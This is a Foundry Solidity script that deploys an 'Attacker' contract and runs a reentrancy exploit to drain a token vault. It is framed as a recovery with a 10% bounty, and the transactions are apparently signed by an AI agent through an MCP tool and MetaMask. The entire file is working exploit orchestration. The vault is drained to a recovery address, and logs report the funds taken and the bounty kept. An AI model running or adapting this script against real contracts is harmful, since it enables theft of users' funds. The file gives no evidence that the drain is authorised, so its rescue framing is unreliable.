// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Script, console} from "forge-std/Script.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Attacker} from "../src/Attacker.sol";

/// @notice MCP-only: run the reentrancy exploit WITHOUT approving attack mode. The MCP
/// approves in its `request_and_approve` step, so the attacker here passes moderator=0
/// (no approve) to avoid a double-approve. Deploys the Attacker, then drains (two
/// transactions; the MCP signs each via MetaMask).
///
/// Prerequisites — set in .env: SENDER_ADDRESS, TOKEN_ADDRESS, VAULT_ADDRESS, RECOVERY_ADDRESS
contract McpAttack is Script {
    uint256 constant BOUNTY_BPS = 1_000; // 10% — display only; keep in sync with Attacker.BOUNTY_BPS

    function run() external {
        address vault = vm.envAddress("VAULT_ADDRESS");
        address token = vm.envAddress("TOKEN_ADDRESS");
        address recovery = vm.envAddress("RECOVERY_ADDRESS");

        uint256 vaultBefore = IERC20(token).balanceOf(vault);
        console.log("Vault balance before:", vaultBefore / 1e18, "tokens");

        vm.startBroadcast();
        Attacker attacker = new Attacker(vault, token, recovery, msg.sender);
        attacker.attack(address(0), address(0)); // moderator=0 → skip approve (already approved)
        vm.stopBroadcast();

        uint256 vaultAfter = IERC20(token).balanceOf(vault);

        // `vaultBefore` is the protocol's recovered funds (the attacker's seed is
        // reclaimed separately); the bounty is 10% of that.
        uint256 recovered = vaultBefore;
        uint256 bounty = (recovered * BOUNTY_BPS) / 10_000;

        console.log("Vault after:", vaultAfter / 1e18, "tokens (drained)");
        console.log("Returned to protocol:", (recovered - bounty) / 1e18, "tokens");
        console.log("Bounty kept (yours):", bounty / 1e18, "tokens (plus your reclaimed seed)");
    }
}
